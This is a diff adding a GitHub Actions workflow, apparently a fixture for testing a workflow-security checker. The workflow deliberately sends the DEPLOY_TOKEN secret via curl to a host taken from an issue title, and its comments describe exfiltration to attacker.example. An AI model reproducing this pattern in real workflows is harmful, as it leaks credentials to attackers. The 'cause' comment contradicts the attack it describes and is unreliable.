@@ -1,0 +1,26 @@
+# situation: on issues opened, a job whose if lets in an issue whose
+#   author_association is MEMBER sends a request with curl and the secret
+#   DEPLOY_TOKEN to the host the issue's title names.
+# reason: a todo (a fact): a member of the organization, who may have read
+#   access only, passes this if (in an organization that lets anyone become a
+#   member, such as by a bot that invites whoever asks, an outsider becomes such
+#   a member), and the secret goes to the member's host.
+# cause: the rule evaluates the if with the attacker's author_association,
+#   for which the if is false.
+# attack: a member of the organization whose role is read opens an issue
+#   titled attacker.example.
+# attack-run-behavior: curl sends the request with Authorization: Bearer and
+#   the value of DEPLOY_TOKEN to attacker.example, and the server of the
+#   attacker logs the header.
+on: 
+  issues:
+    types: [opened]
+jobs:
+  j:
+    runs-on: ubuntu-latest
+    if: github.event.issue.author_association == 'MEMBER'
+    env:
+      DEPLOY_TOKEN: ${{ secrets.DEPLOY_TOKEN }}
+    steps:
+      - run: |
+          curl -fsS -H "Authorization: Bearer $DEPLOY_TOKEN" "https://${{ github.event.issue.title }}/status"
